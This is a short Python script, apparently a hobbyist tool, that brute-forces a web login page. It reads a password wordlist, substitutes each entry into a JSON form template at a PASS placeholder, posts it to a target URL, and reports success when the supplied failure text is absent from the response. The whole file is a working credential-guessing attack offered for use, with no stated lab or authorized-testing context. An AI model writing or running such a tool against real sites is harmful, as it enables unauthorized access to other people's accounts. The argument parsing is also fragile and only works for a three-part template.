import requests
import optparse
import json
#example_arg = {"username":"admin","password":"&PASS&","Login":"Login"}


opt = optparse.OptionParser()
opt.add_option("-w","--worldlist",dest="list_world",help="Enter a wordlist")
opt.add_option("-u","--url",dest="url",help="Enter a target login page")
opt.add_option("-a","--arg",dest="args",help="Enter a arg for send")
opt.add_option("-e","--errortext",dest="errortext",help="Enter a bad response error text (example: Login failed)")
(options,args) = opt.parse_args()

def arg_created(password):
    arg_list = options.args.split("&")
    arg_list[arg_list.index("PASS")] = password
    arg_json = arg_list[0]+arg_list[1]+arg_list[2]
    arg_json = json.loads(arg_json)
    return arg_json

with open(options.list_world,"r") as world:
    word = world.read()
    word = word.split("\n")




for pas in word:
    response = requests.post(options.url,data=arg_created(pas))
    if options.errortext not in response.text:
        print(str(arg_created(pas))+"Bingooooooooo!!!!!!!!!!!")
        break
    else:
        print(arg_created(pas))
